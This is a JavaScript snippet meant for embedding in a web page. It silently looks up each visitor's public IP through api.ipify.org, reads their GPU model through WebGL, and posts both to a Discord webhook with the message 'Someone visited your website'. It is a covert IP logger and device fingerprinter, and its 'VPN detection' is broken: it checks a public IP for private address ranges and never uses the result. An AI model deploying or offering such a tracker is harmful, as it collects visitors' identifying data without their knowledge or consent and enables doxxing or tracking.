    function getUserIP(onNewIP) {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                onNewIP(this.responseText);
            }
        };
        xhr.open("GET", "https://api.ipify.org?format=json", true);
        xhr.send();
    }
    getUserIP(function (ip) {
        const gl = document.createElement('canvas').getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

        var usingVPN = false;
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.ipify.org?format=json', true);
        xhr.onload = function () {
            if (xhr.status >= 200 && xhr.status < 300) {
                var data = JSON.parse(xhr.responseText);
                if (data.ip.startsWith('10.') || data.ip.startsWith('192.168.') || data.ip.startsWith('172.16.')) {
                    usingVPN = true;
                }
            }
        };
        xhr.onerror = function () {
            usingVPN = true;
        };
        xhr.send();

        fetch('DISCORD WEBHOOK HERE', {
            method: 'POST',
            headers: {
        'Content-Type': 'application/json'
                    },
        body: JSON.stringify({
        embeds: [{
            title: 'Someone visited your website',
            description: `IP: ${ip}

            GPU: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`,
            color: 0x800080
            }]
        })
    });
});